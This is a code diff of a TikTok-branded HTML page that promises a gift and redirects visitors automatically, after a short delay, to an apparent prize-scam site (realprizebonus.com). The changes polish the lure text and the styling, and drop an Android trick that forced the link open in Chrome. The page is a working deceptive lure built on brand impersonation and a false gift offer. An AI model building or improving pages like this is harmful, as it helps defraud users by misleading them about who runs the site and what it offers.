@@ -1,11 +1,9 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecpi...</title>
+    <title>Redirecting...</title>
     <link rel="icon" href="https://sf-tb-sg.ibytedtos.com/obj/eden-sg/uhtyvueh7nulogpoguhm/tiktok-icon2.png" type="image/x-icon">
     <style>
         body {
@@ -25,70 +23,42 @@
         }
 
         #redirect-text {
-            font-size: 30px;
+            font-size: 24px;
             color: #333;
-            opacity: 0;
-            animation: fadeIn 2s ease-in-out forwards, scaleUp 2s ease-in-out infinite alternate;
+            text-align: center;
+            padding: 0 20px;
+            animation: fadeIn 1s ease-in-out forwards, scaleUp 1.5s ease-in-out infinite alternate;
         }
 
         @keyframes fadeIn {
-            0% {
-                opacity: 0;
-            }
-
-            100% {
-                opacity: 1;
-            }
+            0% { opacity: 0; }
+            100% { opacity: 1; }
         }
 
         @keyframes scaleUp {
-            0% {
-                transform: scale(1);
-            }
-
-            100% {
-                transform: scale(1.2);
-            }
-        }
-
-        #openLink {
-            margin: 50px;
-            text-align: center;
+            0% { transform: scale(1); }
+            100% { transform: scale(1.08); }
         }
     </style>
-
-
 </head>
 <body>
     <img id="tiktok-logo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjc3uKUdgtRlsd-LUzyjH-h2xQUtTci7MsmUGDJNVwd3RKb3GxreFfG6_a17bc81MLr72clzGfA5c_N2_bl9n_axXYSHis6ekKU469IBOMfd4aRPu8HD0Fq8vYz7iNm7CTs1Ps1sNFd7hV2RXlJld4cpodJ8sNCiZlpu46ekPChAnphsZTGQdpJbhZYXNlh/s1080/548511907.gif" alt="TikTok Logo">
-    <center><p id="redirect-text"><p><strong>Please follow the instructions above to claim your gift ✅</strong></p></center>
-<p><strong></strong></p>
-    <a href="#" id="openLink"></a>
+    
+    <p id="redirect-text"><strong>Please wait, redirecting to claim your gift... ✅</strong></p>
 
     <script>
-        function openLinkBasedOnDevice(url) {
-            var userAgent = navigator.userAgent;
+        function doRedirect() {
+            var targetUrl = 'https://realprizebonus.com/?s1=tiny';
+            var userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
-            if (/(android)/i.test(userAgent)) {
-                // If the device is Android, open the link in Chrome
-                window.location.href = 'intent://' + url.substring(url.indexOf("://") + 3) + '#Intent;scheme=http;package=com.android.chrome;end;';
-            } else if (/(iphone|ipad|ipod)/i.test(userAgent)) {
-                // If the device is iOS, open the link in Safari
-                window.location.href = url;
+            if (/android/i.test(userAgent)) {
+                window.location.replace(targetUrl);
             } else {
-                // For other devices, open the link in the default browser
-                window.location.href = url;
+                window.location.href = targetUrl;
             }
         }
 
-        // Automatically execute the function after a 5-second delay
-        setTimeout(function () {
-            var url = 'https://realprizebonus.com/?s1=tiny';
-            openLinkBasedOnDevice(url);
-        }, 500); // 500 milliseconds = 10 seconds
+        setTimeout(doRedirect, 800);
     </script>
-
-
-
 </body>
 </html>
